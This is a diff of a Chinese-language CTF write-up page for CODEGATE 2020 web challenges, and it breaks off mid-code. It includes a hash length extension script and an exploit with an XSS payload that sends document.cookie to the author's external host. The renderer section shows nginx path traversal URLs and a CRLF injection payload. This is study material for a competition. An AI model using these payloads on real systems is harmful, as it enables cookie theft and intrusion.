@@ -46,7 +46,7 @@
     "articleSection" : "posts",
     "name" : "CODEGATE 2020 Web",
     "headline" : "CODEGATE 2020 Web",
-    "description" : "已经完全变成事后看 writeup 复现型选手了…… CSP 题目直接给了代码 \x26lt;?php require_once \x27config.php\x27; if(!isset($_GET[\x26quot;q\x26quot;]) || !isset($_GET[\x26quot;sig\x26quot;])) { die(\x26quot;?\x26quot;); } $api_string = base64_decode($_GET[\x26quot;q\x26quot;]); $sig = $_GET[\x26quot;sig\x26quot;]; if(md5($salt.$api_string) !== $sig){ die(\x26quot;??\x26quot;); } \/\/APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ... $apis = explode(\x26quot;|\x26quot;, $api_string); foreach($apis as $s) { $info = explode(\x26quot;,\x26quot;, $s); if(count($info) != 3) continue; $n =",
+    "description" : "已经完全变成事后看 writeup 复现型选手了…… CSP 题目直接给了代码 \x26lt;?php require_once \x26#39;config.php\x26#39;; if(!isset($_GET[\x26#34;q\x26#34;]) || !isset($_GET[\x26#34;sig\x26#34;])) { die(\x26#34;?\x26#34;); } $api_string = base64_decode($_GET[\x26#34;q\x26#34;]); $sig = $_GET[\x26#34;sig\x26#34;]; if(md5($salt.$api_string) !== $sig){ die(\x26#34;??\x26#34;); } \/\/APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ... $apis = explode(\x26#34;|\x26#34;, $api_string); foreach($apis as $s) { $info = explode(\x26#34;,\x26#34;, $s); if(count($info) != 3) continue; $n =",
     "inLanguage" : "zh-cn",
     "author" : "syang",
     "creator" : "syang",
@@ -57,7 +57,7 @@
     "datePublished": "2020-02-10 14:22:52 \x2b0800 CST",
     "dateModified" : "2020-02-10 14:22:52 \x2b0800 CST",
     "url" : "https:\/\/syang-ng.github.io\/2020\/02\/codegate-2020-web\/",
-    "wordCount" : "2117",
+    "wordCount" : "2101",
     "keywords" : [  "syang\x27s blog"]
 }
 </script>
@@ -144,167 +144,136 @@
           
           
 
-          
-
-<p>已经完全变成事后看 writeup 复现型选手了……</p>
-
+          <p>已经完全变成事后看 writeup 复现型选手了……</p>
 <h2 id="csp">CSP</h2>
-
 <p>题目直接给了代码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#39;config.php&#39;</span>;
 
-<pre><code class="language-php">&lt;?php
-require_once 'config.php';
-
-if(!isset($_GET[&quot;q&quot;]) || !isset($_GET[&quot;sig&quot;])) {
-    die(&quot;?&quot;);
+<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;q&#34;</span>]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;sig&#34;</span>])) {
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;?&#34;</span>);
 }
 
-$api_string = base64_decode($_GET[&quot;q&quot;]);
-$sig = $_GET[&quot;sig&quot;];
+$api_string <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($_GET[<span style="color:#e6db74">&#34;q&#34;</span>]);
+$sig <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;sig&#34;</span>];
 
-if(md5($salt.$api_string) !== $sig){
-    die(&quot;??&quot;);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">md5</span>($salt<span style="color:#f92672">.</span>$api_string) <span style="color:#f92672">!==</span> $sig){
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;??&#34;</span>);
 }
 
-//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...
-$apis = explode(&quot;|&quot;, $api_string);
-foreach($apis as $s) {
-    $info = explode(&quot;,&quot;, $s);
-    if(count($info) != 3)
-        continue;
-    $n = base64_decode($info[0]);qaq
-    $p1 = base64_decode($info[1]);
-    $p2 = base64_decode($info[2]);
+<span style="color:#75715e">//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...
+</span><span style="color:#75715e"></span>$apis <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;|&#34;</span>, $api_string);
+<span style="color:#66d9ef">foreach</span>($apis <span style="color:#66d9ef">as</span> $s) {
+    $info <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;,&#34;</span>, $s);
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">count</span>($info) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>)
+        <span style="color:#66d9ef">continue</span>;
+    $n <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($info[<span style="color:#ae81ff">0</span>]);<span style="color:#a6e22e">qaq</span>
+    $p1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($info[<span style="color:#ae81ff">1</span>]);
+    $p2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($info[<span style="color:#ae81ff">2</span>]);
 
-    if ($n === &quot;header&quot;) {
-        if(strlen($p1) &gt; 10)
-            continue;
-        if(strpos($p1.$p2, &quot;:&quot;) !== false || strpos($p1.$p2, &quot;-&quot;) !== false) //Don't trick...
-            continue;
-        header(&quot;$p1: $p2&quot;);
+    <span style="color:#66d9ef">if</span> ($n <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;header&#34;</span>) {
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($p1) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>)
+            <span style="color:#66d9ef">continue</span>;
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>($p1<span style="color:#f92672">.</span>$p2, <span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">strpos</span>($p1<span style="color:#f92672">.</span>$p2, <span style="color:#e6db74">&#34;-&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) <span style="color:#75715e">//Don&#39;t trick...
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">continue</span>;
+        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$p1</span><span style="color:#e6db74">: </span><span style="color:#e6db74">$p2</span><span style="color:#e6db74">&#34;</span>);
     }
-    elseif ($n === &quot;cookie&quot;) {
-        setcookie($p1, $p2);
+    <span style="color:#66d9ef">elseif</span> ($n <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;cookie&#34;</span>) {
+        <span style="color:#a6e22e">setcookie</span>($p1, $p2);
     }
-    elseif ($n === &quot;body&quot;) {
-        if(preg_match(&quot;/&lt;.*&gt;/&quot;, $p1))
-            continue;
-        echo $p1;
-        echo &quot;\n&lt;br /&gt;\n&quot;;
+    <span style="color:#66d9ef">elseif</span> ($n <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;body&#34;</span>) {
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/&lt;.*&gt;/&#34;</span>, $p1))
+            <span style="color:#66d9ef">continue</span>;
+        <span style="color:#66d9ef">echo</span> $p1;
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;br /&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
     }
-    elseif ($n === &quot;hello&quot;) {
-        echo &quot;Hello, World!\n&quot;;
+    <span style="color:#66d9ef">elseif</span> ($n <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;hello&#34;</span>) {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hello, World!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
     }
 }
 
-</code></pre>
-
-<p>测试题目功能：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CODEGATE-2020-Web/CSP.png" alt="CSP" class="lazyload"><figcaption class="image-caption">CSP</figcaption></figure></p>
-
+</code></pre></div><p>测试题目功能：</p>
+<p><img src="/images/posts/CODEGATE-2020-Web/CSP.png" alt="CSP"></p>
 <p>可以看到题目提供了 <code>view.php</code> 来先将 <code>(name,p1,p2)</code> 这样一个三元组 base64 拼接之后再签名，签名完成后会通过一个 iframe 形式加载 <code>api.php</code>，即将 <code>view.php</code> 的参数 <code>name</code> \ <code>p1</code> \ <code>p2</code> 转为 <code>api.php</code> 的参数 <code>q</code> \ <code>sig</code>。</p>
-
 <p>此时我们注意到返回的页面存在以下 CSP 规则：</p>
-
 <pre><code>Content-Security-Policy: default-src 'self'; script-src 'none'; base-uri 'none'
-</code></pre>
-
-<p>很明显本题就是考 CSP 绕过的 XSS 了，相应的 CSP 规则为不允许执行 JavaScript、iframe 等标签也只能在同个源下。考虑到题目同时提供了修改 header 和创建 body 等功能，因此我们的思路非常直接：利用 <code>header</code> 功能来绕过 CSP，同时利用 body 来写入 payload 进行 XSS。</p>
-
+</code></pre><p>很明显本题就是考 CSP 绕过的 XSS 了，相应的 CSP 规则为不允许执行 JavaScript、iframe 等标签也只能在同个源下。考虑到题目同时提供了修改 header 和创建 body 等功能，因此我们的思路非常直接：利用 <code>header</code> 功能来绕过 CSP，同时利用 body 来写入 payload 进行 XSS。</p>
 <p>不过由于 view.php 只能提供单一元组 <code>(x,y,z)</code> 的签名，在此之前我们需要通过哈希拓展攻击计算出构造出的 payload 的签名。首先，需要测试出 <code>$salt</code> 变量的长度，编写如下测试脚本，最终发现长度为 12。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> hashpumpy
+<span style="color:#f92672">import</span> base64
 
-<pre><code class="language-python">import requests
-import hashpumpy
-import base64
+orig_sig <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;7f104404b0d414d18ab3efb831e333d7&#34;</span>
+orig_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;,,&#34;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://110.10.147.166/api.php?sig={}&amp;q={}&#34;</span>
 
-orig_sig = &quot;7f104404b0d414d18ab3efb831e333d7&quot;
-orig_data = &quot;,,&quot;
-url = &quot;http://110.10.147.166/api.php?sig={}&amp;q={}&quot;
-
-for i in range(1, 32):
-    result = hashpumpy.hashpump(orig_sig, orig_data, &quot;|Ym9keQ==,YWJj,&quot;, i)
-    sig = result[0]
-    q = base64.b64encode(result[1]).decode()
-    url = url.format(sig, q)
-    res = requests.get(url)
-    if res.text.find('abc') != -1:
-        print(i)
-        break
-</code></pre>
-
-<p>现在我们的 payload 里能同时囊括 header 和 body 了，下一步就需要考虑绕过 CSP，这里利用 404 页面没有 CSP 规则的限定来进行绕过。具体可以参考这篇文章 <a href="http://www.yulegeyu.com/2018/07/15/CSP-unsafe-inline%E6%97%B6-%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8js/" rel="nofollow noreferrer" target="_blank">CSP unsafe-inline时, 引入外部js</a> ，大意上就是利用服务端对 404 页面的 CSP 规则的疏忽来伪造一个可控的 404 页面最终实现 xss。</p>
-
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">32</span>):
+    result <span style="color:#f92672">=</span> hashpumpy<span style="color:#f92672">.</span>hashpump(orig_sig, orig_data, <span style="color:#e6db74">&#34;|Ym9keQ==,YWJj,&#34;</span>, i)
+    sig <span style="color:#f92672">=</span> result[<span style="color:#ae81ff">0</span>]
+    q <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(result[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode()
+    url <span style="color:#f92672">=</span> url<span style="color:#f92672">.</span>format(sig, q)
+    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+    <span style="color:#66d9ef">if</span> res<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;abc&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">print</span>(i)
+        <span style="color:#66d9ef">break</span>
+</code></pre></div><p>现在我们的 payload 里能同时囊括 header 和 body 了，下一步就需要考虑绕过 CSP，这里利用 404 页面没有 CSP 规则的限定来进行绕过。具体可以参考这篇文章 <a href="http://www.yulegeyu.com/2018/07/15/CSP-unsafe-inline%E6%97%B6-%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8js/">CSP unsafe-inline时, 引入外部js</a> ，大意上就是利用服务端对 404 页面的 CSP 规则的疏忽来伪造一个可控的 404 页面最终实现 xss。</p>
 <p>下面来具体操作，在 header 里设置 <code>HTTP/1 404</code> ，可以发现返回的页面中不存在令我们头疼的 CSP 规则：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CODEGATE-2020-Web/404-without-CSP.png" alt="404 without CSP" class="lazyload"><figcaption class="image-caption">404 without CSP</figcaption></figure></p>
-
+<p><img src="/images/posts/CODEGATE-2020-Web/404-without-CSP.png" alt="404 without CSP"></p>
 <p>在 CSP 规则不存在的情况下，我们非常简单就可以在 body 处进行 xss，考虑到 waf <code>if(preg_match(&quot;/&lt;.*&gt;/&quot;, $p1)) continue;</code>，所以需要利用 html 对不完整标签的支持来绕过。最终 exp 如下：</p>
+<h3 id="exp--flag">exp &amp; flag</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> hashpumpy
+<span style="color:#f92672">import</span> base64
 
-<h3 id="exp-flag">exp &amp; flag</h3>
+orig_sig <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;badc953c8e3c164c4be0b6fb3b388834&#34;</span>
+orig_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;aGVhZGVy,SFRUUC8xIDQwNA==,Q1NQ&#34;</span> <span style="color:#75715e"># (header, HTTP/1 404, CSP)</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://110.10.147.166/api.php?sig={}&amp;q={}&#34;</span>
 
-<pre><code class="language-python">import requests
-import hashpumpy
-import base64
+body <span style="color:#f92672">=</span> (base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;body&#39;</span>),base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;img src=x onerror=&#34;document.location=`http://www.syang.xyz/?flag=`+document.cookie&#34;&#39;</span>),<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)
 
-orig_sig = &quot;badc953c8e3c164c4be0b6fb3b388834&quot;
-orig_data = &quot;aGVhZGVy,SFRUUC8xIDQwNA==,Q1NQ&quot; # (header, HTTP/1 404, CSP)
-url = &quot;http://110.10.147.166/api.php?sig={}&amp;q={}&quot;
-
-body = (base64.b64encode(b'body'),base64.b64encode(b'&lt;img src=x onerror=&quot;document.location=`http://www.syang.xyz/?flag=`+document.cookie&quot;'),b'')
-
-exp = &quot;|{},{},{}&quot;.format(
-    body[0].decode('utf8'),
-    body[1].decode('utf8'),
-    ''
+exp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;|{},{},{}&#34;</span><span style="color:#f92672">.</span>format(
+    body[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf8&#39;</span>),
+    body[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf8&#39;</span>),
+    <span style="color:#e6db74">&#39;&#39;</span>
     )
 
-result = hashpumpy.hashpump(orig_sig, orig_data, exp, 12)
-url = url.format(result[0], base64.b64encode(result[1]).decode())
-print(url)
-res = requests.get(url)
-print(res.text)
-</code></pre>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CODEGATE-2020-Web/CSP-flag.png" alt="CSP - flag" class="lazyload"><figcaption class="image-caption">CSP - flag</figcaption></figure></p>
-
+result <span style="color:#f92672">=</span> hashpumpy<span style="color:#f92672">.</span>hashpump(orig_sig, orig_data, exp, <span style="color:#ae81ff">12</span>)
+url <span style="color:#f92672">=</span> url<span style="color:#f92672">.</span>format(result[<span style="color:#ae81ff">0</span>], base64<span style="color:#f92672">.</span>b64encode(result[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode())
+<span style="color:#66d9ef">print</span>(url)
+res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+<span style="color:#66d9ef">print</span>(res<span style="color:#f92672">.</span>text)
+</code></pre></div><p><img src="/images/posts/CODEGATE-2020-Web/CSP-flag.png" alt="CSP - flag"></p>
 <p>CODEGATE2020{CSP_m34n5_Content-Success-Policy_n0t_Security}</p>
-
 <h2 id="renderer">renderer</h2>
-
-<p>题目给了两个文件，分别是 <code>Dockerfile</code>:</p>
-
-<pre><code class="language-dockerfile">FROM python:2.7.16
-
-ENV FLAG CODEGATE2020{**DELETED**}
-
-RUN apt-get update
-RUN apt-get install -y nginx
-RUN pip install flask uwsgi
-
-ADD prob_src/src /home/src
-ADD settings/nginx-flask.conf /tmp/nginx-flask.conf
-
-ADD prob_src/static /home/static
-RUN chmod 777 /home/static
-
-RUN mkdir /home/tickets
-RUN chmod 777 /home/tickets
-
-ADD settings/run.sh /home/run.sh
-RUN chmod +x /home/run.sh
-
-ADD settings/cleaner.sh /home/cleaner.sh
-RUN chmod +x /home/cleaner.sh
-
-CMD [&quot;/bin/bash&quot;, &quot;/home/run.sh&quot;]
-
-</code></pre>
-
-<p><code>run.sh</code>:</p>
-
-<pre><code class="language-shell">#!/bin/bash
-
+<p>题目给了两个文件，分别是 <code>Dockerfile </code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> python:2.7.16</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> FLAG CODEGATE2020<span style="color:#f92672">{</span>**DELETED**<span style="color:#f92672">}</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get install -y nginx<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> pip install flask uwsgi<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> prob_src/src /home/src<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> settings/nginx-flask.conf /tmp/nginx-flask.conf<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> prob_src/static /home/static<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod <span style="color:#ae81ff">777</span> /home/static<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir /home/tickets<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod <span style="color:#ae81ff">777</span> /home/tickets<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> settings/run.sh /home/run.sh<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /home/run.sh<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> settings/cleaner.sh /home/cleaner.sh<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /home/cleaner.sh<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;/home/run.sh&#34;</span>]<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p><code>run.sh</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
 service nginx stop
 mv /etc/nginx/sites-enabled/default /tmp/
 mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask
@@ -315,189 +284,141 @@ uwsgi /home/src/uwsgi.ini &amp;
 /bin/bash /home/cleaner.sh &amp;
 
 /bin/bash
-</code></pre>
-
-<p>题目给出这两个配置的文件主要还是提醒我们注意以下两点：</p>
-
+</code></pre></div><p>题目给出这两个配置的文件主要还是提醒我们注意以下两点：</p>
 <ol>
 <li>python 2.7.16</li>
 <li>nginx + uwsgi</li>
 </ol>
-
 <h3 id="题目功能">题目功能</h3>
-
 <p>可以看到是一个 proxy 题，题目会代替你请求相应的 link 并将结果返回：</p>
+<p><img src="/images/posts/CODEGATE-2020-Web/renderer.png" alt="renderer"></p>
+<h3 id="nginx-配置不当---目录穿越">nginx 配置不当 - 目录穿越</h3>
+<p>CTF 中 nginx 相关的常见考点：配置不当导致的目录穿越问题，该问题的具体描述可以参考 phith0n 的 <a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">三个案例看Nginx配置安全</a>。这里只需要知道一个结论，当 nginx 存在配置不当的问题时，可能使用 <code>..</code> 来进行目录穿越。</p>
+<p>利用 http://58.229.253.144/static../src/app/<strong>init</strong>.py 成功获得源码：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
+<span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> routes
+<span style="color:#f92672">import</span> os
 
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CODEGATE-2020-Web/renderer.png" alt="renderer" class="lazyload"><figcaption class="image-caption">renderer</figcaption></figure></p>
-
-<h3 id="nginx-配置不当-目录穿越">nginx 配置不当 - 目录穿越</h3>
-
-<p>CTF 中 nginx 相关的常见考点：配置不当导致的目录穿越问题，该问题的具体描述可以参考 phith0n 的 <a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" rel="nofollow noreferrer" target="_blank">三个案例看Nginx配置安全</a>。这里只需要知道一个结论，当 nginx 存在配置不当的问题时，可能使用 <code>..</code> 来进行目录穿越。</p>
-
-<p>利用 <a href="http://58.229.253.144/static../src/app/__init__.py" rel="nofollow noreferrer" target="_blank">http://58.229.253.144/static../src/app/__init__.py</a> 成功获得源码：</p>
-
-<pre><code class="language-python">from flask import Flask
-from app import routes
-import os
-
-app = Flask(__name__)
-app.url_map.strict_slashes = False
-app.register_blueprint(routes.front, url_prefix=&quot;/renderer&quot;)
-app.config[&quot;FLAG&quot;] = os.getenv(&quot;FLAG&quot;, &quot;CODEGATE2020{}&quot;)
-</code></pre>
-
-<p>利用 <a href="http://58.229.253.144/static../src/app/routes.py" rel="nofollow noreferrer" target="_blank">http://58.229.253.144/static../src/app/routes.py</a> 获得路由，相应文件已经贴到 gist 上了 <a href="https://gist.github.com/syang-ng/2525351b649bb5bfe6e586c2f2a5af4b" rel="nofollow noreferrer" target="_blank">routes.py</a></p>
-
+app <span style="color:#f92672">=</span> Flask(__name__)
+app<span style="color:#f92672">.</span>url_map<span style="color:#f92672">.</span>strict_slashes <span style="color:#f92672">=</span> False
+app<span style="color:#f92672">.</span>register_blueprint(routes<span style="color:#f92672">.</span>front, url_prefix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/renderer&#34;</span>)
+app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;FLAG&#34;</span>] <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>, <span style="color:#e6db74">&#34;CODEGATE2020{}&#34;</span>)
+</code></pre></div><p>利用 http://58.229.253.144/static../src/app/routes.py 获得路由，相应文件已经贴到 gist 上了 <a href="https://gist.github.com/syang-ng/2525351b649bb5bfe6e586c2f2a5af4b">routes.py</a></p>
 <h3 id="crlf-注入">CRLF 注入</h3>
-
 <p>测试题目功能，请求 VPS：</p>
-
-<pre><code class="language-shell">Connection from [58.229.253.144] port 8181 [tcp/*] accepted (family 2, sport 46462)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Connection from <span style="color:#f92672">[</span>58.229.253.144<span style="color:#f92672">]</span> port <span style="color:#ae81ff">8181</span> <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> accepted <span style="color:#f92672">(</span>family 2, sport 46462<span style="color:#f92672">)</span>
 GET / HTTP/1.1
 Accept-Encoding: identity
 Host: xxx.xxx.xxx:8181
 Connection: close
 User-Agent: Python-urllib/2.7
-</code></pre>
-
-<p>发现题目使用的是 urllib 完成请求，搜索 urllib 和 python2.7.16 关键字，搜得 CVE-2019-9947，其影响范围恰好 &lt;= python2.7.16，测试 payload <code>http://vps-ip:port?%0d%0apayload%0d%0apadding</code> 成功，说明 CRLF 注入问题存在。</p>
-
+</code></pre></div><p>发现题目使用的是 urllib 完成请求，搜索 urllib 和 python2.7.16 关键字，搜得 CVE-2019-9947，其影响范围恰好 &lt;= python2.7.16，测试 payload <code>http://vps-ip:port?%0d%0apayload%0d%0apadding</code> 成功，说明 CRLF 注入问题存在。</p>
 <h3 id="源码审计">源码审计</h3>
-
 <p>一般而言，python 的考点以 ssti 居多，特别是 flask，因此先注意所有的 <code>render_template</code> 函数：</p>
-
-<pre><code class="language-python">@front.route(&quot;/whatismyip&quot;, methods=[&quot;GET&quot;])
-def ipcheck():
-    return render_template(&quot;ip.html&quot;, ip = get_ip(), real_ip = get_real_ip())
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@front.route</span>(<span style="color:#e6db74">&#34;/whatismyip&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ipcheck</span>():
+    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;ip.html&#34;</span>, ip <span style="color:#f92672">=</span> get_ip(), real_ip <span style="color:#f92672">=</span> get_real_ip())
   
-def get_ip():
-    return request.remote_addr
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_ip</span>():
+    <span style="color:#66d9ef">return</span> request<span style="color:#f92672">.</span>remote_addr
 
-def get_real_ip():
-    return request.headers.get(&quot;X-Forwarded-For&quot;) or get_ip()
-</code></pre>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_real_ip</span>():
+    <span style="color:#66d9ef">return</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;X-Forwarded-For&#34;</span>) <span style="color:#f92672">or</span> get_ip()
+</code></pre></div><p>虽然这里的路由 <code>/whatismyip</code> 可以被 <code>X-Forwarded-For</code> 影响，但实际测试中发现无法触发 ssti 漏洞，因此需要继续审计代码获得漏洞点：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@front.route</span>(<span style="color:#e6db74">&#34;/admin/ticket&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin_ticket</span>():
+    ip <span style="color:#f92672">=</span> get_ip()
+    rip <span style="color:#f92672">=</span> get_real_ip()
 
